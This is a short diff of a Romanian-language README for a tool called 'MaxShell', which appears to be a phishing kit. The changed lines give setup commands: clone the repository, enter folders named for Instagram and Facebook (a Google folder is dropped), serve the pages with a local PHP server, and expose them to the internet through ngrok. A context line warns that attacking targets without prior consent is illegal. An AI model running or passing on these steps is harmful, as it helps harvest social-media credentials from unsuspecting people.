@@ -18,7 +18,7 @@ Utilizarea Scriptul MaxShell pentru a ataca ținte fără acordul reciproc preal
 git clone https://github.com/hacking12345678/MaxShell.git
 <br>cd MaxShell
 <br>ls
-<br>cd instagram,facebook,google
+<br>cd instagram,facebook
 <br>php -S 127.0.0.1:???? < port
 <br> ngrok http ???? < port
 # $ Instalaţi aplicaţia Ngrok 
